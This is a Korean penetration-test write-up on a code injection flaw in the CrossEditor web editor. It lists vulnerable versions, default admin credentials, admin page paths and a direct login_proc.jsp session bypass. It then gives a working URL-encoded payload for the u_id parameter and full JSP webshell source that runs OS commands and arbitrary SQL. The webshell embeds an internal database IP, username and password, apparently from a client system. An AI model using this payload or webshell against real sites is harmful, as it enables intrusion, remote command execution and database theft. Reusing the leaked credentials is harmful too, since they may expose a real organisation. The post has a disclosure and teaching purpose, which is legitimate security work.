---
layout: post
title:  "크로스 에디터 (code injection)"
tags: Injection CVE
---

# 크로스 에디터 (code injection)

### 취약점 개요 및 영향 버전

고객사 모의침투 프로젝트 진행 중 사이트에서 사용중인 상용 솔루션 크로스에디터가 취약 버전으로 확인 되었고 해당하는 사이트에서 파일 다운로드 취약점을 찾아 취약 소스코드를 분석하게 되었습니다. `PoC가 공개되지 않아서 다른 모의해킹 및 취약점 점검 프로젝트에서 발견되지 못하고 잠재적으로 노후된 솔루션 버전을 사용`하고 있을 가능성이 높다고 생각했고 발견 이후 프로젝트 진행 시 기 취약점으로 쉽게 웹쉘을 업로드할 수 있는 경우가 많았습니다.

![1-00](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-1__.png)

### 취약 소스코드

- 크로스 에디터 특성 상 사용중인 웹 시스템에 그대로 소스코드를 integration해야 하므로 별도로 DB를 구축할 수 없어 관리자 **계정 정보를 소스코드로 하드코딩해서 보관**하게 됩니다.
- 패스워드 변경 시 패스워드는 암호화가 되어서 보관되지만 id 파라미터의 경우 전달받아 그대로 평문으로 저장됩니다.
- 위의 특성을 통해 패스워드 변경을 처리하는 페이지에 운영체제 명령어를 실행하는 소스코드 인젝션 시 비밀번호 변경 처리 페이지가 웹쉘로 탈바꿈되어 침투가 가능합니다.

![1-0](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-2_1_.png)

### 취약점 전제조건

1. 취약한 버전을 사용해야 합니다.
- 3.5.1.38 이하 버전
- 4.3.2.29 이하 버전
1. 관리자 계정이 취약해야 합니다.
- 디폴트 계정 ID : admin / PW : 1234
- 기본적으로 임계값은 설정되어 있지 않기 때문에 알려진 패스워드로 사전 대입 공격도 고려할 수 있습니다.

### 취약점 확인 방법

글쓰기 등으로 에디터 플러그인에 접근이 가능하다면 `Ctrl+Shift+A` 를 이용해서 버전 확인이 가능합니다.

![1-1 크로스 에디터 버전 확인.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-1_%ED%81%AC%EB%A1%9C%EC%8A%A4_%EC%97%90%EB%94%94%ED%84%B0_%EB%B2%84%EC%A0%84_%ED%99%95%EC%9D%B8.png)

일반적으로 사용되는 경로나 plugin javascript 등을 통해서 크로스 에디터 관리자 페이지 경로로 접근할 수 있습니다.

<aside>
💡 취약점 발견 당시 확인 되었던 관리자 페이지 경로
/namoEditor/plugin/crossEditor/manage/index.html
/namo2/manage/index.html

</aside>

![Untitled](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/Untitled.png)

간혹 관리자 페이지를 삭제해서 메인 페이지에 접근하지 못하도록 조치 한 경우도 존재합니다.

![1-3 관리자 페이지 막힘.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-3_%EA%B4%80%EB%A6%AC%EC%9E%90_%ED%8E%98%EC%9D%B4%EC%A7%80_%EB%A7%89%ED%9E%98.png)

로그인을 처리하는 페이지로 직접 접근해서 세션을 획득하면 됩니다.

<aside>
💡 /namo2/manage/jsp/login_proc.jsp

</aside>

![1-4 URL로 직접 접근.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-4_URL%EB%A1%9C_%EC%A7%81%EC%A0%91_%EC%A0%91%EA%B7%BC.png)

획득한 세션으로 취약 모듈인 패스워드 변경 페이지로 직접 접근합니다.

<aside>
💡 /namo2/manage/jsp/account_setting.jsp

</aside>

![1-5 패스워드 변경 페이지 직접 접근.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-5_%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C_%EB%B3%80%EA%B2%BD_%ED%8E%98%EC%9D%B4%EC%A7%80_%EC%A7%81%EC%A0%91_%EC%A0%91%EA%B7%BC.png)

### 취약점 재현

Step 1) 비밀번호 변경 시 u_id 파라미터에  코드 인젝션을 진행하면 됩니다. 코드 인젝션으로 소스코드가 변경되기 때문에 주의사항이 필요합니다.

- 코드 인젝션 시 컴파일 에러가 발생하지 않도록 올바른 코드를 입력해야합니다.
(테스트 환경을 구축해서 테스트해보고 공격 페이로드를 입력하는게 안전합니다.)
- ID/PW 변수가 손상되면 관리자 로그인이 불가능해질 수 있습니다.
    
    ![1-7.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-7.png)
    

Step 2) manageInfo.jsp로 접근해서 운영체제 명령어를 실행합니다.

![Untitled](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/Untitled%201.png)

Step 3) manageInfo.jsp의 공격 전후입니다.
![1-6 변경 전후.png](/assets/images/%E1%84%8F%E1%85%B3%E1%84%85%E1%85%A9%E1%84%89%E1%85%B3%20%E1%84%8B%E1%85%A6%E1%84%83%E1%85%B5%E1%84%90%E1%85%A5%20(code%20injection)%20b619f8cee01f405e9d5fd967b305365a/1-6_%EB%B3%80%EA%B2%BD_%EC%A0%84%ED%9B%84.png)

### 공격 페이로드
```jsx

admin";%0a%25>%0a<%25@+page+language="java"+contentType="text/html;+charset=UTF-8"+pageEncoding="UTF-8"%25>%0a<%25@+page+import="java.util.*,java.io.*"%25>%0a<meta+charset="UTF-8">%0a<form+method=GET+Action='manageInfo.jsp'>%0a<input+name='cmd'+type=text+style="width:500px;height:50px;">%0a<input+type=submit+value='Run'>%0a</Form>%0a<textarea+style="width:700px;height:500px">%0a<%25%0a%09String+cmd+=+request.getParameter("cmd");%0a%09String+output+=+"";%0a%09if(cmd+!=+null)+{ %0a%09%09String+s+=null;%0a%09%09try+{ %0a%09%09%09Process+p+=+Runtime.getRuntime().exec("cmd.exe+/C+"%2bcmd);%0a%09%09%09BufferedReader+sI+=+new+BufferedReader(new+InputStreamReader(p.getInputStream()));%0a%09%09%09while((s+=+sI.readLine())+!=+null)+{ %0a%09%09%09%09out.println(s);%0a%09%09%09}%0a%09%09}%0a%09%09catch(IOException+e)+{ %0a%09%09%09e.printStackTrace();%0a%09%09}%0a%09}%0a%25>%0a</textarea>%0a<%25%0a%09String+a+="1

```

공격 코드 원본

```java
admin";
%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.lang.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.io.*"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<meta charset="UTF-8">
<h1> Coommand Execute </h1>
<form method=POST Action='manageInfo.jsp'>
 <input name='cmd' type=text style="width:500px;height:50px;">
 <input type=submit value='Run'>
</Form>
<br>
<textarea style="width:700px;height:500px">
<%
 String cmd = request.getParameter("cmd");
 String output = "";
 if(cmd != null) {
  String s =null;
  try {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
    while((s = sI.readLine()) != null) {
      out.println(s);
    }
  }
  catch(IOException e) {
    e.printStackTrace();
  }
 }
 %>
</textarea>
<br><br><br>
<h1> SQL Execute </h1>
<form method="GET" action="">
 <input name="query" type="text" style="width:500px; height:50px;">
 <input type="submit" value="RUN">
</form>
<br><br>
<%
 String sql = request.getParameter("query");
 if(sql != null) {
   try {
     String url = "jdbc:oracle:thin:@172.25.251.124:1721:HABISPDB";
     String user = "MATIE";
     String pass = "MATIE_20";

     Class.forName("oracle.jdbc.driver.OracleDriver");
     Connection conn = DriverManager.getConnection(url, user, pass);
     Statement stmt = conn.createStatement();
     ResultSet rs= stmt.executeQuery(sql);
     ResultSetMetaData rsmd = rs.getMetaData();
     int count = rsmd.getColumnCount();
     out.println("<br><br>");
     out.println("<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"width:500px; border: 1px solid #444444; text-align:center;\">");
     out.println("<tr>");
     for(int i=1; i<=count; i++){
       out.println("<th>"+rsmd.getColumnLabel(i)+"</th>");
     }
     out.println("</tr>");
     while(rs.next()){
       out.println("<tr>");

       for(int i=1; i<=count; i++)
       {

         switch(rsmd.getColumnType(i))
         {
           case Types.NUMERIC :
           case Types.INTEGER :
             out.println("<td>"+rs.getInt(i)+"</td>"); break;
           case Types.FLOAT :
             out.println("<td>"+rs.getFloat(i)+"</td>"); break;
           case Types.DOUBLE :
             out.println("<td>"+rs.getDouble(i)+"</td>"); break;
           case Types.DATE :
             out.println("<td>"+rs.getDate(i)+"</td>"); break;
           case Types.CHAR :
           default :
             out.println("<td>"+rs.getString(i)+"</td>");
         }
       }
       out.println("</tr>");

     }
     out.println("</table>");
     conn.close();
   }
   catch(Exception e)
   {
      out.println("<br><br>");
      out.println("not query or sql error");
   }
 }

%>
<% String a="123
```

### 실습환경

```bash
docker pull rbdhks9826/crs
```